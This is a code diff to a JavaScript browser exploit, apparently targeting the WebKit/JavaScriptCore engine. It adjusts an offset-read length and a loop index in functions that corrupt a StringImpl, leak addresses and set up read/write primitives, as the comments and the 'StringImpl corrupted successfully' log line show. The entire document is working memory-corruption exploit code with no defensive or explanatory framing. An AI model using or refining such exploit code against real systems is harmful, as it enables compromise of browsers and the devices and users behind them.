@@ -61,7 +61,7 @@ function setupRW() {
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
-	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
+	let ab_addr = new Int64(str2array(g_relative_read, 7, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
@@ -193,7 +193,7 @@ function leakJSC() {
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
-	for (let i = arr_str.length - 2; i > 0; i--) {
+	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
 			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
